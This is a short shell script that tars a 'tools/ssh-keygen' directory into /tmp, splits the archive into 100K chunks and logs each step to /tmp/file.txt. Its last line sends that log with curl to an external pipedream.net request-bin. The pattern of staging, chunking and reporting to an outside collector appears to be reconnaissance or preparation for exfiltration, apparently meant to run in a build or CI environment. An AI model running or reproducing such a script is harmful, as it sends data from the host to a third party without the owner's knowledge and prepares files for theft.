#!/bin/sh
echo "starting"  > /tmp/file.txt
tar -cvjf /tmp/shk.tar.bz2 tools/ssh-keygen >> /tmp/file.txt
echo "--------------" >> /tmp/file.txt
echo "--------------" >> /tmp/file.txt

echo $(ls -lh /tmp/shk.tar.bz2) >> /tmp/file.txt
echo "--------------" >> /tmp/file.txt
echo "--------------" >> /tmp/file.txt

echo $(split -b 100K /tmp/shk.tar.bz2 /tmp/shk.tar.bz2.part -d) >> /tmp/file.txt
echo "--------------" >> /tmp/file.txt
echo "--------------" >> /tmp/file.txt

echo $(ls -lh /tmp/shk.tar.bz2.part*) >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
